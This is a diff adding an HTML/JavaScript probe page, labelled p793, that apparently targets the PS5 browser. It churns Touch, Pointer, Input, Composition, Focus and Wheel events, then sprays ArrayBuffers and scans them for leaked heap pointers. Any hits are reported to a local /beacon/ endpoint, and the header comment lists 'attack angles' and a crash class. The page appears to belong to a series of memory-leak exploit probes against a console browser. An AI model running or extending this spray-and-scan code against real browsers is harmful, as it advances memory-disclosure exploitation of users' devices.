@@ -1,0 +1,523 @@
+<!--
+  p793: Touch / PointerEvent / InputEvent / CompositionEvent /
+        FocusEvent / WheelEvent internal state residue
+
+  Touch/TouchEvent: new Touch() creates C++ Touch objects with
+  identifier, target, client/page/screen coordinates, radiusX/Y,
+  rotationAngle, force. TouchEvent wraps a TouchList of C++ Touch
+  objects. Each Touch object allocates from the event pool. On PS5
+  the browser may support touch (DualSense touchpad), so the
+  constructor path should be live.
+
+  PointerEvent: extends MouseEvent with C++ PointerEvent fields:
+  pointerId, width, height, pressure, tangentialPressure, tiltX/Y,
+  twist, pointerType. Constructor allocates C++ backing with
+  coalesced/predicted event lists. getCoalescedEvents() and
+  getPredictedEvents() exercise the event list allocator.
+
+  InputEvent: extends UIEvent with inputType, data, dataTransfer,
+  isComposing, getTargetRanges(). Constructor creates C++
+  InputEvent with StaticRange objects for target ranges.
+
+  CompositionEvent: compositionstart/update/end create C++
+  CompositionEvent with locale and data strings. The IME state
+  machine allocates C++ composition session objects.
+
+  FocusEvent: extends UIEvent with relatedTarget. blur/focus
+  event dispatch exercises C++ FocusController state including
+  focus scope chains and active element tracking.
+
+  WheelEvent: extends MouseEvent with deltaX/Y/Z and deltaMode.
+  Constructor allocates C++ WheelEvent with scroll deltas and
+  phase information. Rapid wheel dispatch exercises the scroll
+  event coalescing path.
+
+  Attack angles:
+  A) Touch/TouchEvent constructor with varied Touch lists.
+  B) PointerEvent with coalesced/predicted events.
+  C) InputEvent with target ranges on contenteditable.
+  D) CompositionEvent start/update/end cycles.
+  E) FocusEvent rapid focus/blur cycling.
+  F) WheelEvent constructor and dispatch churn.
+
+  CRASH_CLASS: LOW (event constructors, no side effects)
+  prior art: p788 (contenteditable), p791 (dialog)
+-->
+<!DOCTYPE html><html><head><meta charset="utf-8"><title>p793</title>
+<script>
+function b(m){try{var x=new XMLHttpRequest();x.open('GET','/beacon/'+encodeURIComponent(m),false);x.send();}catch(e){}}
+function hex64(dv,off){
+  var lo=dv.getUint32(off,true),hi=dv.getUint32(off+4,true);
+  var hs=hi.toString(16),ls=lo.toString(16);
+  while(ls.length<8)ls='0'+ls;
+  return '0x'+hs+ls;
+}
+function isPtr(dv,off){
+  var hi=dv.getUint32(off+4,true);
+  return hi!==0 && hi!==0xFFFFFFFF && (hi>>>0)<0x80000000 && hi>0x100;
+}
+function sprayAndScan(tag,round,sizes){
+  var hits=0;
+  for(var si=0;si<sizes.length;si++){
+    var sz=sizes[si];
+    for(var i=0;i<200;i++){
+      var ab=new ArrayBuffer(sz);
+      var dv=new DataView(ab);
+      for(var off=0;off+8<=sz;off+=8){
+        if(isPtr(dv,off)){
+          hits++;
+          if(hits<=2)b(tag+'-PTR round='+round+' sz='+sz+' i='+i+' off='+off+' val='+hex64(dv,off));
+        }
+      }
+    }
+  }
+  return hits;
+}
+
+window.onload=function(){
+b('p793-START');
+
+// === Section A: Touch/TouchEvent constructor churn ===
+try{
+  b('A-touch');
+  var aHits=0;
+
+  var touchSupported=typeof Touch!=='undefined'&&typeof TouchEvent!=='undefined';
+  if(!touchSupported){
+    b('A-SKIP no Touch/TouchEvent constructors');
+  }else{
+    var target=document.createElement('div');
+    target.style.cssText='width:200px;height:200px;background:#eee;';
+    document.body.appendChild(target);
+
+    for(var round=0;round<5;round++){
+      (function(){
+        var events=[];
+
+        for(var i=0;i<50;i++){
+          try{
+            var touches=[];
+            for(var t=0;t<5;t++){
+              touches.push(new Touch({
+                identifier:round*1000+i*10+t,
+                target:target,
+                clientX:10+t*30+i,
+                clientY:20+t*20+round*5,
+                pageX:10+t*30+i,
+                pageY:20+t*20+round*5,
+                screenX:10+t*30+i,
+                screenY:20+t*20+round*5,
+                radiusX:11.5+t,
+                radiusY:13.5+t,
+                rotationAngle:t*15,
+                force:0.5+t*0.1
+              }));
+            }
+
+            var te=new TouchEvent('touchstart',{
+              touches:touches,
+              targetTouches:touches,
+              changedTouches:[touches[0]],
+              bubbles:true,
+              cancelable:true
+            });
+
+            events.push(te);
+
+            // Also create move and end events
+            var moveEvt=new TouchEvent('touchmove',{
+              touches:touches.slice(0,3),
+              targetTouches:touches.slice(0,3),
+              changedTouches:[touches[1]],
+              bubbles:true
+            });
+            events.push(moveEvt);
+
+            var endEvt=new TouchEvent('touchend',{
+              touches:[],
+              targetTouches:[],
+              changedTouches:touches,
+              bubbles:true
+            });
+            events.push(endEvt);
+          }catch(e){
+            if(i===0&&round===0)b('A touch_err='+e.message);
+            break;
+          }
+        }
+
+        if(round===0)b('A created '+events.length+' TouchEvents (50 x start+move+end)');
+
+        // Dispatch some
+        for(var i=0;i<Math.min(30,events.length);i++){
+          try{target.dispatchEvent(events[i]);}catch(e){}
+        }
+
+        events=null;
+      })();
+
+      for(var i=0;i<3000;i++){var tmp=new ArrayBuffer(64);}
+      aHits+=sprayAndScan('A',round,[32,48,64,96,128]);
+    }
+
+    document.body.removeChild(target);
+  }
+  b('A-DONE hits='+aHits);
+}catch(e){b('A-ERR '+e.message);}
+
+// === Section B: PointerEvent with coalesced/predicted ===
+try{
+  b('B-pointer');
+  var bHits=0;
+
+  var peSupported=typeof PointerEvent!=='undefined';
+  if(!peSupported){
+    b('B-SKIP no PointerEvent');
+  }else{
+    var target=document.createElement('div');
+    target.style.cssText='width:200px;height:200px;background:#ddd;touch-action:none;';
+    document.body.appendChild(target);
+
+    for(var round=0;round<5;round++){
+      (function(){
+        var events=[];
+
+        for(var i=0;i<80;i++){
+          try{
+            var pe=new PointerEvent('pointermove',{
+              pointerId:round*100+i,
+              width:i%10+1,
+              height:i%10+1,
+              pressure:0.5+i*0.005,
+              tangentialPressure:0.1*((i%5)-2),
+              tiltX:(i%60)-30,
+              tiltY:(i%40)-20,
+              twist:i%360,
+              pointerType:['mouse','pen','touch'][i%3],
+              isPrimary:i===0,
+              clientX:50+i*2,
+              clientY:50+round*10,
+              bubbles:true
+            });
+
+            events.push(pe);
+
+            // Access coalesced/predicted if available
+            if(pe.getCoalescedEvents){
+              var coalesced=pe.getCoalescedEvents();
+              if(round===0&&i===0)b('B coalesced='+coalesced.length);
+            }
+            if(pe.getPredictedEvents){
+              var predicted=pe.getPredictedEvents();
+              if(round===0&&i===0)b('B predicted='+predicted.length);
+            }
+          }catch(e){
+            if(i===0&&round===0)b('B pe_err='+e.message);
+          }
+        }
+
+        // Also create down/up/cancel
+        for(var i=0;i<20;i++){
+          try{
+            events.push(new PointerEvent('pointerdown',{
+              pointerId:5000+round*100+i,pointerType:'touch',
+              clientX:i*10,clientY:i*5,bubbles:true
+            }));
+            events.push(new PointerEvent('pointerup',{
+              pointerId:5000+round*100+i,pointerType:'touch',
+              clientX:i*10+5,clientY:i*5+3,bubbles:true
+            }));
+            events.push(new PointerEvent('pointercancel',{
+              pointerId:6000+round*100+i,pointerType:'pen',bubbles:true
+            }));
+          }catch(e){}
+        }
+
+        if(round===0)b('B created '+events.length+' PointerEvents');
+
+        // Dispatch
+        for(var i=0;i<Math.min(50,events.length);i++){
+          try{target.dispatchEvent(events[i]);}catch(e){}
+        }
+
+        events=null;
+      })();
+
+      for(var i=0;i<3000;i++){var tmp=new ArrayBuffer(64);}
+      bHits+=sprayAndScan('B',round,[32,48,64,96]);
+    }
+
+    document.body.removeChild(target);
+  }
+  b('B-DONE hits='+bHits);
+}catch(e){b('B-ERR '+e.message);}
+
+// === Section C: InputEvent with target ranges ===
+try{
+  b('C-inputevent');
+  var cHits=0;
+
+  for(var round=0;round<5;round++){
+    (function(){
+      var events=[];
+
+      var inputTypes=['insertText','insertParagraph','deleteContentBackward',
+        'deleteContentForward','insertFromPaste','insertFromDrop',
+        'formatBold','formatItalic','formatUnderline','historyUndo','historyRedo'];
+
+      // Create a contenteditable for dispatching
+      var editable=document.createElement('div');
+      editable.contentEditable='true';
+      editable.style.cssText='width:300px;height:100px;border:1px solid #999;';
+      editable.textContent='Editable content for round '+round+' with some text to work with.';
+      document.body.appendChild(editable);
+      try{editable.focus();}catch(e){}
+
+      for(var i=0;i<60;i++){
+        try{
+          var ie=new InputEvent('beforeinput',{
+            inputType:inputTypes[i%inputTypes.length],
+            data:i%3===0?'inserted_text_'+round+'_'+i:null,
+            isComposing:i%5===0,
+            bubbles:true,
+            cancelable:true
+          });
+          events.push(ie);
+
+          var ie2=new InputEvent('input',{
+            inputType:inputTypes[i%inputTypes.length],
+            data:i%3===0?'inserted_text_'+round+'_'+i:null,
+            isComposing:i%5===0,
+            bubbles:true
+          });
+          events.push(ie2);
+        }catch(e){
+          if(i===0&&round===0)b('C ie_err='+e.message);
+        }
+      }
+
+      if(round===0)b('C created '+events.length+' InputEvents across '+inputTypes.length+' types');
+
+      // Dispatch to exercise C++ InputEvent processing
+      for(var i=0;i<events.length;i++){
+        try{editable.dispatchEvent(events[i]);}catch(e){}
+      }
+
+      // Access getTargetRanges on beforeinput events
+      for(var i=0;i<events.length;i+=2){
+        try{
+          var ranges=events[i].getTargetRanges();
+          if(round===0&&i===0)b('C targetRanges='+ranges.length);
+        }catch(e){}
+      }
+
+      document.body.removeChild(editable);
+      events=null;
+    })();
+
+    for(var i=0;i<3000;i++){var tmp=new ArrayBuffer(64);}
+    cHits+=sprayAndScan('C',round,[32,48,64,96]);
+  }
+  b('C-DONE hits='+cHits);
+}catch(e){b('C-ERR '+e.message);}
+
+// === Section D: CompositionEvent start/update/end cycles ===
+try{
+  b('D-composition');
+  var dHits=0;
+
+  for(var round=0;round<5;round++){
+    (function(){
+      var events=[];
+
+      var input=document.createElement('input');
+      input.type='text';
+      document.body.appendChild(input);
+      try{input.focus();}catch(e){}
+
+      for(var i=0;i<50;i++){
+        try{
+          // Simulate IME composition session
+          var start=new CompositionEvent('compositionstart',{
+            data:'',
+            bubbles:true
+          });
+          events.push(start);
+
+          // Multiple updates (like typing kanji candidates)
+          for(var u=0;u<5;u++){
+            var update=new CompositionEvent('compositionupdate',{
+              data:'compose_'+round+'_'+i+'_step'+u+'_'+'k'.repeat(3+u),
+              bubbles:true
+            });
+            events.push(update);
+          }
+
+          var end=new CompositionEvent('compositionend',{
+            data:'final_'+round+'_'+i,
+            bubbles:true
+          });
+          events.push(end);
+        }catch(e){
+          if(i===0&&round===0)b('D comp_err='+e.message);
+        }
+      }
+
+      if(round===0)b('D created '+events.length+' CompositionEvents (50 sessions x 7 events)');
+
+      // Dispatch
+      for(var i=0;i<events.length;i++){
+        try{input.dispatchEvent(events[i]);}catch(e){}
+      }
+
+      document.body.removeChild(input);
+      events=null;
+    })();
+
+    for(var i=0;i<3000;i++){var tmp=new ArrayBuffer(64);}
+    dHits+=sprayAndScan('D',round,[32,48,64,96]);
+  }
+  b('D-DONE hits='+dHits);
+}catch(e){b('D-ERR '+e.message);}
+
+// === Section E: FocusEvent rapid focus/blur cycling ===
+try{
+  b('E-focus');
+  var eHits=0;
+
+  for(var round=0;round<5;round++){
+    (function(){
+      var elements=[];
+
+      // Create various focusable elements
+      for(var i=0;i<30;i++){
+        var el;
+        switch(i%5){
+          case 0: el=document.createElement('input');el.type='text'; break;
+          case 1: el=document.createElement('button');el.textContent='Btn'+i; break;
+          case 2: el=document.createElement('textarea'); break;
+          case 3: el=document.createElement('a');el.href='#';el.textContent='Link'+i; break;
+          case 4: el=document.createElement('select');
+            var o=document.createElement('option');o.textContent='opt';el.appendChild(o); break;
+        }
+        el.tabIndex=i;
+        document.body.appendChild(el);
+        elements.push(el);
+      }
+
+      // Rapid focus cycling
+      for(var cyc=0;cyc<10;cyc++){
+        for(var i=0;i<elements.length;i++){
+          try{elements[i].focus();}catch(e){}
+        }
+        // Reverse
+        for(var i=elements.length-1;i>=0;i--){
+          try{
+            elements[i].focus();
+            elements[i].blur();
+          }catch(e){}
+        }
+      }
+
+      // Dispatch synthetic FocusEvents
+      for(var i=0;i<elements.length;i++){
+        try{
+          var fe=new FocusEvent('focus',{
+            relatedTarget:elements[(i+1)%elements.length],
+            bubbles:false
+          });
+          elements[i].dispatchEvent(fe);
+
+          var be=new FocusEvent('blur',{
+            relatedTarget:elements[(i+2)%elements.length],
+            bubbles:false
+          });
+          elements[i].dispatchEvent(be);
+
+          var fi=new FocusEvent('focusin',{
+            relatedTarget:elements[(i+1)%elements.length],
+            bubbles:true
+          });
+          elements[i].dispatchEvent(fi);
+
+          var fo=new FocusEvent('focusout',{
+            relatedTarget:elements[(i+2)%elements.length],
+            bubbles:true
+          });
+          elements[i].dispatchEvent(fo);
+        }catch(e){}
+      }
+
+      if(round===0)b('E cycled focus across '+elements.length+' elements, 10 cycles + synthetic events');
+
+      for(var i=0;i<elements.length;i++){
+        document.body.removeChild(elements[i]);
+      }
+      elements=null;
+    })();
+
+    for(var i=0;i<3000;i++){var tmp=new ArrayBuffer(64);}
+    eHits+=sprayAndScan('E',round,[32,48,64,96]);
+  }
+  b('E-DONE hits='+eHits);
+}catch(e){b('E-ERR '+e.message);}
+
+// === Section F: WheelEvent constructor and dispatch churn ===
+try{
+  b('F-wheel');
+  var fHits=0;
+
+  for(var round=0;round<5;round++){
+    (function(){
+      var events=[];
+
+      var target=document.createElement('div');
+      target.style.cssText='width:200px;height:200px;overflow:auto;';
+      var inner=document.createElement('div');
+      inner.style.cssText='width:400px;height:400px;background:linear-gradient(red,blue);';
+      target.appendChild(inner);
+      document.body.appendChild(target);
+
+      for(var i=0;i<100;i++){
+        try{
+          var we=new WheelEvent('wheel',{
+            deltaX:(i%3-1)*10,
+            deltaY:(i%5-2)*50+round*10,
+            deltaZ:i%2===0?0:5,
+            deltaMode:[0,1,2][i%3],
+            clientX:100+i,
+            clientY:100+round*5,
+            bubbles:true,
+            cancelable:true
+          });
+          events.push(we);
+        }catch(e){
+          if(i===0&&round===0)b('F wheel_err='+e.message);
+        }
+      }
+
+      if(round===0){
+        b('F created '+events.length+' WheelEvents');
+        if(events[0])b('F sample deltaY='+events[0].deltaY+' deltaMode='+events[0].deltaMode);
+      }
+
+      // Dispatch
+      for(var i=0;i<events.length;i++){
+        try{target.dispatchEvent(events[i]);}catch(e){}
+      }
+
+      document.body.removeChild(target);
+      events=null;
+    })();
+
+    for(var i=0;i<3000;i++){var tmp=new ArrayBuffer(64);}
+    fHits+=sprayAndScan('F',round,[32,48,64,96]);
+  }
+  b('F-DONE hits='+fHits);
+}catch(e){b('F-ERR '+e.message);}
+
+b('p793-COMPLETE');
+};
+</script>
+</head>
+<body></body></html>
